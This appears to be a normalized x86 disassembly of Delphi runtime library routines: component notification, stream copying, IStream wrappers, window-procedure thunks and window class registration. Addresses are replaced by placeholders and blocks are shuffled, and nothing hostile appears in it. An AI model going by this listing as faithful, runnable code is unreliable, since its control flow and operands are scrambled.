call InterlockedExchange
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_4206e3
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov [ ebp - 0x1 ] al
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov al 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4206ea
mov eax [ ebp - 0xc ]
call sub_403290
retn
jmp r-xdata
mov eax [ ebp - 0xc ]
cmp [ eax + 0x8 ] 0x0
jg r-xdata
xor edx edx
mov eax [ ebp - 0xc ]
call sub_418310
mov [ ebp - 0x8 ] eax
xor edx edx
mov eax [ ebp - 0xc ]
call sub_418200
push rw-data
call LeaveCriticalSection
xor eax eax
push ebp
push sub_4206ad
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push sub_42067e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
mov eax [ ebx + 0xc ]
call [ ebx + 0x8 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
push rw-data
call EnterCriticalSection
retn
sub_420714
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
mov al [ r-xdata ]
mov [ edi + 0x24 ] al
test esi esi
je r-xdata
add esp 0xfffffff0
call sub_4035dc
mov eax edi
test bl bl
je r-xdata
mov edx edi
mov eax esi
call sub_4208cc
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_403634
pop [ fs : 0x0 ]
add esp 0xc
sub_420760
push ebx
push esi
push ecx
call sub_403644
mov [ esp ] dl
mov ebx eax
mov eax ebx
call sub_4209b4
cmp [ ebx + 0x14 ] 0x0
je r-xdata
mov eax ebx
call sub_42095c
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
jmp r-xdata
mov dl [ esp ]
and dl 0xfc
mov eax ebx
call sub_4188e0
cmp [ esp ] 0x0
jle r-xdata
mov edx ebx
call sub_420924
mov esi [ ebx + 0x14 ]
test esi esi
je r-xdata
pop edx
pop esi
pop ebx
retn
mov eax ebx
call sub_40362c
lea eax [ ebx + 0x14 ]
call sub_40d070
cmp [ esi + 0x8 ] 0x0
jg r-xdata
mov edx [ esi + 0x8 ]
dec edx
mov eax esi
call sub_418310
mov cl 0x1
mov edx ebx
mov esi [ eax ]
call [ esi + 0x10 ]
sub_4207e4
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
cmp [ ebx + 0x14 ] 0x0
jne r-xdata
cmp eax [ esi + 0x4 ]
je r-xdata
mov edx esi
mov eax [ ebx + 0x14 ]
call sub_41836c
test eax eax
jge r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403260
mov [ ebx + 0x14 ] eax
or [ ebx + 0x1c ] 0x100
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x14 ]
call sub_4181b4
mov edx ebx
mov eax esi
call sub_4207e4
sub_420878
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x10 ] 0x0
jne r-xdata
mov edx esi
mov eax [ ebx + 0x10 ]
call sub_4181b4
mov [ esi + 0x4 ] ebx
pop esi
pop ebx
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_403260
mov [ ebx + 0x10 ] eax
sub_4208a4
push ebx
mov ebx eax
xor eax eax
mov [ edx + 0x4 ] eax
mov eax [ ebx + 0x10 ]
call sub_4184ac
mov eax [ ebx + 0x10 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
pop ebx
retn
call sub_403290
xor eax eax
mov [ ebx + 0x10 ] eax
sub_4208cc
push ebx
push esi
push edi
mov ebx edx
mov edi eax
mov edx edi
mov eax ebx
mov si 0xfff5
call sub_40348c
mov eax [ ebx + 0x8 ]
push eax
xor ecx ecx
mov edx ebx
mov eax edi
mov esi [ eax ]
call [ esi + 0x20 ]
mov edx ebx
mov eax edi
call sub_420878
mov dl 0x1
mov eax ebx
call sub_420dec
test [ edi + 0x1c ] 0x10
je r-xdata
xor ecx ecx
mov edx ebx
mov eax edi
mov ebx [ eax ]
call [ ebx + 0x10 ]
pop edi
pop esi
pop ebx
retn
mov cl 0x1
mov dl 0x1
mov eax ebx
call sub_420d9c
sub_420924
push ebx
push esi
push edi
mov ebx edx
mov esi eax
push 0x0
mov ecx [ ebx + 0x8 ]
mov edx ebx
mov eax esi
mov edi [ eax ]
call [ edi + 0x20 ]
mov cl 0x1
mov edx ebx
mov eax esi
mov edi [ eax ]
call [ edi + 0x10 ]
xor edx edx
mov eax ebx
call sub_420dec
mov edx ebx
mov eax esi
call sub_4208a4
pop edi
pop esi
pop ebx
retn
sub_42095c
push ebx
push esi
push edi
mov esi eax
jmp r-xdata
mov ebx [ esi + 0x10 ]
test ebx ebx
jne r-xdata
mov eax ebx
call sub_4183f8
mov edi eax
test [ edi + 0x1d ] 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov edx edi
mov eax esi
call sub_420924
jmp r-xdata
mov ax [ r-xdata ]
and ax [ esi + 0x1c ]
mov dx [ r-xdata ]
cmp dx ax
jne r-xdata
mov dl 0x1
mov eax edi
mov ecx [ eax ]
call [ ecx - 0x4 ]
mov edx edi
mov eax esi
call sub_4208a4
sub_4209b4
push ebx
push esi
push edi
mov ebx eax
test [ ebx + 0x1c ] 0x8
jne r-xdata
pop edi
pop esi
pop ebx
retn
or [ ebx + 0x1c ] 0x8
mov eax [ ebx + 0x10 ]
test eax eax
je r-xdata
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
mov edx edi
mov eax [ ebx + 0x10 ]
call sub_418310
call sub_4209b4
inc edi
dec esi
jne r-xdata
sub_4209f0
push ebx
mov ebx eax
mov eax [ ebx + 0x14 ]
test eax eax
je r-xdata
pop ebx
retn
call sub_4184ac
mov eax [ ebx + 0x14 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
call sub_403290
xor eax eax
mov [ ebx + 0x14 ] eax
sub_420a14
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_4209f0
mov edx ebx
mov eax esi
call sub_4209f0
pop esi
pop ebx
retn
sub_420a30
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] cl
mov edi edx
mov esi eax
cmp [ esp ] 0x1
jne r-xdata
mov eax [ esi + 0x10 ]
test eax eax
je r-xdata
test edi edi
je r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov edx edi
mov eax esi
call sub_420a14
mov edx ebx
mov eax [ esi + 0x10 ]
call sub_418310
mov cl [ esp ]
mov edx edi
mov ebp [ eax ]
call [ ebp + 0x10 ]
dec ebx
mov eax [ esi + 0x10 ]
mov eax [ eax + 0x8 ]
cmp ebx eax
jl r-xdata
test ebx ebx
jge r-xdata
mov ebx eax
dec ebx
sub_420a8c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi edx
mov ebx eax
xor eax eax
mov [ ebp - 0x4 ] eax
mov eax [ esi + 0x20 ]
test eax eax
je r-xdata
push ebx
push sub_420838
push ebx
push sub_420860
mov ax [ ebx + 0x18 ]
cmp ax [ ebp - 0x4 ]
setne cl
mov edx r-xdata
mov eax esi
mov edi [ eax ]
call [ edi + 0x4 ]
push ebx
push sub_42084c
push ebx
push sub_42086c
mov ax [ ebp - 0x2 ]
cmp ax [ ebx + 0x1a ]
setne cl
mov edx r-xdata
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x4 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ eax + 0x18 ]
mov [ ebp - 0x4 ] eax
sub_420b84
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov esi [ ebp + 0x8 ]
test edi edi
je r-xdata
test [ ebx + 0x1c ] 0x10
je r-xdata
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_407e64
test al al
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
cmp [ ebx + 0x4 ] 0x0
je r-xdata
cmp ebx [ edi + 0x4 ]
jne r-xdata
push esi
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax [ ebx + 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x20 ]
mov edx esi
mov eax ebx
call sub_420c1c
test eax eax
je r-xdata
mov [ ebp - 0xc ] esi
mov [ ebp - 0x8 ] 0xb
lea eax [ ebp - 0xc ]
push eax
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b888
call sub_403a44
sub_420c1c
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] edx
mov edi eax
cmp [ esp ] 0x0
je r-xdata
xor esi esi
cmp [ edi + 0x10 ] 0x0
je r-xdata
mov eax [ edi + 0x10 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor ebp ebp
mov eax esi
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebp
dec ebx
jne r-xdata
mov eax [ edi + 0x10 ]
mov edx ebp
call sub_418310
mov esi eax
mov eax [ esi + 0x8 ]
mov edx [ esp ]
call sub_407e64
test al al
jne r-xdata
sub_420c6c
push ebx
push esi
push edi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov eax [ ebx + 0x8 ]
mov edx esi
call sub_404414
je r-xdata
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
test esi esi
je r-xdata
mov edi [ ebx + 0x4 ]
test edi edi
je r-xdata
mov eax esi
call sub_407f80
test al al
jne r-xdata
push esi
mov ecx [ ebx + 0x8 ]
xor edx edx
mov eax ebx
mov edi [ eax ]
call [ edi + 0x20 ]
push esi
mov ecx [ ebx + 0x8 ]
mov edx ebx
mov eax edi
mov edi [ eax ]
call [ edi + 0x20 ]
jmp r-xdata
mov [ esp ] esi
mov [ esp + 0x4 ] 0xb
push esp
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b888
call sub_403a44
xor edx edx
mov eax ebx
call sub_420dec
mov edx esi
mov eax ebx
call sub_420cf8
mov dl 0x1
mov eax ebx
call sub_420dec
sub_420d0c
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x10 ] 0x0
jne r-xdata
mov edx esi
mov eax [ ebx + 0x10 ]
call sub_418310
pop esi
pop ebx
retn
mov edx [ rw-data ]
mov ecx esi
mov eax [ r-xdata ]
call sub_41829c
sub_420d48
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ eax + 0x10 ]
mov edx ebx
call sub_41836c
test eax eax
jl r-xdata
mov edx [ ebx + 0x4 ]
mov edi [ edx + 0x10 ]
mov edx [ edi + 0x8 ]
test esi esi
jge r-xdata
cmp edx esi
jg r-xdata
xor esi esi
cmp eax esi
je r-xdata
mov esi edx
dec esi
mov edx edi
xchg edx eax
call sub_418200
mov eax [ ebx + 0x4 ]
mov eax [ eax + 0x10 ]
mov ecx ebx
mov edx esi
call sub_41838c
sub_420d9c
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] cl
mov ebx edx
mov esi eax
test bl bl
je r-xdata
and [ esi + 0x1c ] 0xffef
or [ esi + 0x1c ] 0x10
jmp r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_420d38
mov ebp eax
dec ebp
test ebp ebp
jl r-xdata
cmp [ esp ] 0x0
je r-xdata
inc ebp
xor edi edi
mov edx edi
mov eax esi
call sub_420d0c
mov cl 0x1
mov edx ebx
call sub_420d9c
inc edi
dec ebp
jne r-xdata
sub_420dec
push ebx
push esi
push edi
add esp 0xffffff00
mov ebx edx
mov edi eax
mov esi [ edi + 0x4 ]
test esi esi
je r-xdata
add esp 0x100
pop edi
pop esi
pop ebx
retn
mov eax esp
mov edx [ edi + 0x8 ]
mov ecx 0xff
call sub_4042a4
mov edx esp
mov eax esi
call sub_40358c
test eax eax
je r-xdata
test bl bl
je r-xdata
xor edx edx
mov [ eax ] edx
mov [ eax ] edi
jmp r-xdata
sub_420e34
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov edx esi
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov ebx eax
test bl bl
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov edx esi
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x40 ]
sub_420e5c
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov edx esi
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov ebx eax
test bl bl
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov edx esi
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x3c ]
sub_420ea4
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x10 ]
mov esi [ ebp + 0xc ]
mov ebx [ ebp + 0x8 ]
cmp [ ebx + 0x20 ] 0x0
jne r-xdata
push edi
push esi
mov eax [ ebx + 0x20 ]
push eax
mov eax [ eax ]
call [ eax ]
mov ecx edi
mov edx esi
mov eax ebx
call sub_403344
test al al
je r-xdata
mov eax 0x80004002
jmp r-xdata
xor eax eax
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
sub_420f04
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x20 ] 0x0
jne r-xdata
mov eax [ eax + 0x20 ]
push eax
mov eax [ eax ]
call [ eax + 0x8 ]
or eax 0xffffffff
jmp r-xdata
pop ebp
retn 0x4
sub_420f28
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_403260
mov edx esi
mov eax edi
mov ecx [ eax ]
call [ ecx ]
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035dc
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_403634
pop [ fs : 0x0 ]
add esp 0xc
sub_420f70
push ebx
push esi
call sub_403644
mov ebx edx
mov esi eax
mov eax [ esi + 0x10 ]
test eax eax
je r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403280
test bl bl
jle r-xdata
mov edx esi
call sub_4211a0
pop esi
pop ebx
retn
mov eax esi
call sub_40362c
sub_420fd8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x10 ]
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
test eax eax
je r-xdata
mov [ ebx + 0x10 ] esi
test esi esi
je r-xdata
mov edx ebx
call sub_4211a0
mov edx ebx
mov eax esi
call sub_421194
sub_42101c
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_420714
mov dl 0x1
mov eax [ r-xdata ]
call sub_403260
mov [ esi + 0x50 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035dc
mov eax esi
pop esi
pop ebx
retn
call sub_403634
pop [ fs : 0x0 ]
add esp 0xc
sub_421060
push ebx
push esi
push edi
call sub_403644
mov ebx edx
mov edi eax
mov edx ebx
and dl 0xfc
mov eax edi
call sub_420760
mov eax [ edi + 0x30 ]
test eax eax
je r-xdata
mov esi [ edi + 0x50 ]
cmp [ esi + 0x8 ] 0x0
jg r-xdata
mov edx edi
call sub_420a14
jmp r-xdata
mov eax esi
call sub_4183f8
mov edx eax
mov eax edi
call sub_4211a0
lea eax [ edi + 0x50 ]
call sub_40d070
test bl bl
jle r-xdata
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_40362c
sub_4210c0
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_420a30
cmp bl 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp esi [ edi + 0x30 ]
jne r-xdata
xor eax eax
mov [ edi + 0x30 ] eax
sub_4210ec
push ebx
cmp [ eax + 0x42 ] 0x0
je r-xdata
xor eax eax
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x44 ]
call [ ebx + 0x40 ]
mov al 0x1
pop ebx
retn
sub_421108
push ebx
cmp [ eax + 0x4a ] 0x0
je r-xdata
xor eax eax
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x4c ]
call [ ebx + 0x48 ]
mov al 0x1
pop ebx
retn
sub_421124
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebp + 0x8 ]
cmp eax [ ebx + 0x40 ]
jne r-xdata
mov eax [ ebx + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ ebp + 0xc ]
cmp eax [ ebx + 0x44 ]
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x40 ] eax
mov eax [ ebp + 0xc ]
mov [ ebx + 0x44 ] eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
inc esi
xor edi edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov edx edi
mov eax [ ebx + 0x50 ]
call sub_418310
mov edx [ eax ]
call [ edx + 0x10 ]
inc edi
dec esi
jne r-xdata
sub_4211a0
push ebx
push esi
push edi
push ebp
mov ebp edx
mov edi eax
mov eax [ edi + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor ebx ebx
inc ebx
dec esi
jne r-xdata
xor eax eax
mov [ ebp + 0x10 ] eax
mov eax [ edi + 0x50 ]
mov edx ebx
call sub_418200
jmp r-xdata
mov eax [ edi + 0x50 ]
mov edx ebx
call sub_418310
cmp ebp eax
jne r-xdata
sub_4211e0
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x30 ]
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
test eax eax
je r-xdata
mov eax esi
mov [ ebx + 0x30 ] eax
test eax eax
je r-xdata
mov edx ebx
call sub_420a14
mov edx ebx
call sub_4207e4
sub_42120c
push ebp
mov ebp esp
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_403260
mov [ edi + 0xc ] esi
mov al [ ebp + 0x8 ]
mov [ edi + 0x10 ] al
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035dc
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
call sub_403634
pop [ fs : 0x0 ]
add esp 0xc
sub_421254
push ebx
push esi
call sub_403644
mov ebx edx
mov esi eax
cmp [ esi + 0x10 ] 0x1
jne r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403280
test bl bl
jle r-xdata
mov eax [ esi + 0xc ]
call sub_403290
xor eax eax
mov [ esi + 0xc ] eax
pop esi
pop ebx
retn
mov eax esi
call sub_40362c
sub_42128c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
xor ecx ecx
push ebp
push sub_4212db
push [ fs : ecx ]
mov [ fs : ecx ] esp
test edx edx
jne r-xdata
mov eax [ eax + 0xc ]
mov ecx [ ebp + 0x10 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
cmp [ ebp + 0x14 ] 0x0
je r-xdata
mov ebx 0x80030009
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor ebx ebx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov edx [ ebp + 0x14 ]
mov [ edx ] eax
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
sub_4212f4
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
xor ecx ecx
push ebp
push sub_421343
push [ fs : ecx ]
mov [ fs : ecx ] esp
test edx edx
jne r-xdata
mov eax [ eax + 0xc ]
mov ecx [ ebp + 0x10 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
cmp [ ebp + 0x14 ] 0x0
je r-xdata
mov ebx 0x80030009
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor ebx ebx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov edx [ ebp + 0x14 ]
mov [ edx ] eax
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
sub_42135c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov ebx [ ebp + 0x14 ]
mov esi [ ebp + 0x8 ]
xor eax eax
push ebp
push sub_4213c6
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
jl r-xdata
mov ebx 0x80030001
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
cmp ebx 0x2
jle r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x14
mov eax [ esi + 0xc ]
mov ecx ebx
mov edx [ ebp + 0xc ]
mov ebx [ eax ]
call [ ebx + 0x14 ]
cdq
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] edx
mov eax [ ebp + 0x18 ]
test eax eax
je r-xdata
xor ebx ebx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp + 0x18 ]
mov edx [ ebp - 0x8 ]
mov [ eax ] edx
mov edx [ ebp - 0x4 ]
mov [ eax + 0x4 ] edx
sub_4213e0
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx [ ebp + 0x8 ]
xor eax eax
push ebp
push sub_421429
push [ fs : eax ]
mov [ fs : eax ] esp
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
mov eax [ ebx + 0xc ]
call sub_41a8e4
mov eax [ ebx + 0xc ]
mov edx [ eax ]
call [ edx ]
cmp edx [ ebp + 0x10 ]
jne r-xdata
je r-xdata
cmp eax [ ebp + 0xc ]
xor ebx ebx
mov ebx 0x80004005
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub_421444
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
mov eax [ ebp + 0xc ]
call sub_4058e8
xor eax eax
push ebp
push sub_421631
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x18 ] 0x0
mov [ ebp - 0x14 ] 0x0
mov [ ebp - 0x20 ] 0x0
mov [ ebp - 0x1c ] 0x0
xor edx edx
push ebp
push sub_42160a
push [ fs : edx ]
mov [ fs : edx ] esp
cmp [ ebp + 0x14 ] 0x0
jne r-xdata
jle r-xdata
cmp [ ebp + 0x10 ] 0x100000
jbe r-xdata
mov eax [ ebp + 0x10 ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0xc ] 0x100000
jmp r-xdata
jmp r-xdata
cmp [ ebp + 0x14 ] 0x0
jne r-xdata
mov eax [ ebp - 0xc ]
call sub_4026cc
mov [ ebp - 0x8 ] eax
xor edx edx
push ebp
push sub_4215f9
push [ fs : edx ]
mov [ fs : edx ] esp
jmp r-xdata
jg r-xdata
cmp [ ebp + 0x10 ] 0x0
ja r-xdata
cmp [ ebp + 0x14 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
call sub_4026ec
mov eax [ ebp + 0x1c ]
test eax eax
je r-xdata
jmp r-xdata
jle r-xdata
cmp [ ebp + 0x10 ] 0x7fffffff
jbe r-xdata
mov eax [ ebp + 0x18 ]
test eax eax
je r-xdata
mov eax [ ebp + 0x1c ]
mov edx [ ebp - 0x20 ]
mov [ eax ] edx
mov edx [ ebp - 0x1c ]
mov [ eax + 0x4 ] edx
mov esi [ ebp + 0x10 ]
mov esi 0x7fffffff
jmp r-xdata
jmp r-xdata
retn
mov eax [ ebp + 0x18 ]
mov edx [ ebp - 0x18 ]
mov [ eax ] edx
mov edx [ ebp - 0x14 ]
mov [ eax + 0x4 ] edx
cmp esi [ ebp - 0xc ]
jle r-xdata
test esi esi
jle r-xdata
mov eax esi
mov eax [ ebp - 0xc ]
jmp r-xdata
mov eax ebx
cdq
add [ ebp - 0x18 ] eax
adc [ ebp - 0x14 ] edx
mov [ ebp - 0x28 ] 0x0
mov [ ebp - 0x24 ] 0x0
lea eax [ ebp - 0x28 ]
push eax
push ebx
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ eax ]
call [ eax + 0x10 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x28 ]
mov edx [ ebp - 0x24 ]
add [ ebp - 0x20 ] eax
adc [ ebp - 0x1c ] edx
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
call sub_403af0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov edx [ ebp - 0x8 ]
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx + 0xc ]
xchg ecx eax
mov ebx [ eax ]
call [ ebx + 0xc ]
mov ebx eax
test ebx ebx
jne r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp - 0x28 ]
cmp ebx eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_421638
lea eax [ ebp + 0xc ]
call sub_405874
retn
sub esi ebx
mov eax ebx
cdq
sub [ ebp + 0x10 ] eax
sbb [ ebp + 0x14 ] edx
test esi esi
jg r-xdata
call sub_403af0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov [ ebp - 0x4 ] 0x80004005
sub_421674
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
xor esi esi
xor eax eax
push ebp
push sub_4216d7
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov [ ebx + 0x4 ] 0x2
mov eax [ edi + 0xc ]
mov edx [ eax ]
call [ edx ]
mov [ ebx + 0x8 ] eax
mov [ ebx + 0xc ] edx
xor eax eax
mov [ ebx + 0x10 ] eax
xor eax eax
mov [ ebx + 0x14 ] eax
xor eax eax
mov [ ebx + 0x18 ] eax
xor eax eax
mov [ ebx + 0x1c ] eax
xor eax eax
mov [ ebx + 0x20 ] eax
xor eax eax
mov [ ebx + 0x24 ] eax
mov [ ebx + 0x2c ] 0x1
mov eax esi
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
sub_421708
push ebp
mov ebp esp
push ebx
push esi
push edi
mov eax [ rw-data ]
call sub_4186d4
mov edi eax
xor eax eax
push ebp
push sub_42175d
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ edi + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_421764
mov eax [ rw-data ]
call sub_418738
retn
inc ebx
xor esi esi
mov edx esi
mov eax edi
call sub_418310
call sub_403290
inc esi
dec ebx
jne r-xdata
sub_42177c
push ebp
mov ebp esp
xor eax eax
push eax
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
mov edx esp
mov eax [ ecx + 0x4 ]
call [ ecx ]
add esp 0xc
pop eax
pop ebp
retn 0x10
sub_4217a4
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi rw-data
cmp [ edi ] 0x0
jne r-xdata
mov eax [ edi ]
mov ebx [ edi ]
mov edx [ ebx + 0x5 ]
mov [ edi ] edx
mov edx [ ebp + 0x8 ]
mov [ ebx + 0x5 ] edx
mov edx [ ebp + 0xc ]
mov [ ebx + 0x9 ] edx
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
push 0x40
push 0x1000
push 0x1000
push 0x0
call VirtualAlloc
mov esi eax
mov eax [ rw-data ]
mov [ esi ] eax
lea edx [ esi + 0x4 ]
mov eax rw-data
mov ecx 0x2
call sub_4028c8
mov edx sub_42177c
lea eax [ esi + 0x5 ]
call sub_42179c
mov [ esi + 0x6 ] eax
lea ebx [ esi + 0xa ]
mov [ ebx ] 0xe8
lea edx [ esi + 0x4 ]
mov eax ebx
call sub_42179c
mov [ ebx + 0x1 ] eax
mov eax [ edi ]
mov [ ebx + 0x5 ] eax
mov [ edi ] ebx
add ebx 0xd
mov eax ebx
sub eax esi
cmp eax 0xffc
jl r-xdata
mov [ rw-data ] esi
sub_421860
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
mov eax [ rw-data ]
mov [ rw-data ] eax
lea eax [ ebp - 0x28 ]
push eax
mov eax [ rw-data ]
push eax
mov eax [ rw-data ]
push eax
call GetClassInfoA
cmp eax 0x1
sbb eax eax
inc eax
test al al
je r-xdata
test al al
je r-xdata
mov edx DefWindowProcA
cmp edx [ ebp - 0x24 ]
je r-xdata
push rw-data
call RegisterClassA
mov eax [ rw-data ]
push eax
mov eax [ rw-data ]
push eax
